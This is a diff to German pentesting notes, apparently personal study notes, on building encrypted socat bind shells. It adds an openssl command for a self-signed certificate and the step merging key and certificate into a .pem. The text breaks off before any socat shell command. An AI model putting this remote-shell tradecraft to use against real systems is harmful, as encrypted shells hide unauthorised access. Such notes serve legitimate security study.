@@ -25,6 +25,7 @@ Mit dem Angreifer PC folgende #Reverseshell spawnen
 Mit #Socat können #Ecrypted #BindShells erstellt werden. 
 Dazu geht man wie folgt vor:
 
+Auf der Angreifermaschine ein neues #SSL-Zertifikat erzeugen:
 `openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt`
 
 -   req: initiate a new certificate signing request
@@ -35,4 +36,11 @@ Dazu geht man wie folgt vor:
 -   -x509: output a self-signed certificate instead of a certificate request
 -   -days: set validity period in days
 -   -out: save the certificate to a file
+
+Man erhält nun zwei #Zertifikate - bind_shell.key und bind_shell.crt.
+Damit #Socat die #Zertifikate akzeptiert, müssen diese in ein .pem-File verwandelt werden.
+
+`cat bind_shell.key bind_shell.crt > bind_shell.pem`
+
+Um nun eine verschl
 
